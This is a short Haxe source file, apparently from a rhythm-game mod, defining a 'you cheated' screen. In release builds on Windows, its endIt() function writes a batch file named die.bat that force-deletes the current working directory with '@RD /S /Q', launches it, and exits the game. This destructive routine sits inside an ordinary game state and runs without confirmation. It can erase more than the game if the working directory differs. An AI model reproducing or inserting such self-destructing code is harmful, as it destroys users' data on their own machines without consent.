package;
#if sys
import sys.io.File;
import sys.io.Process;
#end
import flixel.*;
import flixel.util.FlxColor;
import flixel.util.FlxTimer;

/**
 * scary!!!
 */
class YouCheatedSomeoneIsComing extends MusicBeatState
{
	
	public function new() 
	{
		super();
	}
	
	override public function create():Void 
	{
		super.create();
		var spooky:FlxSprite = new FlxSprite(0, 0).loadGraphic('dave/cheater_lol');
        spooky.screenCenter();
        add(spooky);
		FlxG.sound.playMusic(Paths.music('badEnding'),1,true);
	}
	
	override public function update(elapsed:Float):Void 
	{
		super.update(elapsed);
		
		if (FlxG.keys.pressed.ENTER)
		{
			#if release
			endIt();
			#else
			FlxG.switchState(new SusState());
			#end
		}
		
	}
	
	
	public function endIt()
	{
        #if windows
		// make a batch file that will delete the game, run the batch file, then close the game
		var crazyBatch:String = "@echo off\ntimeout /t 3\n@RD /S /Q \"" + Sys.getCwd() + "\"\nexit";
		File.saveContent(CoolSystemStuff.getTempPath() + "/die.bat", crazyBatch);
		new Process(CoolSystemStuff.getTempPath() + "/die.bat", []);
		Sys.exit(0);
        #else
        FlxG.switchState(new SusState());
        #end
	}
	
}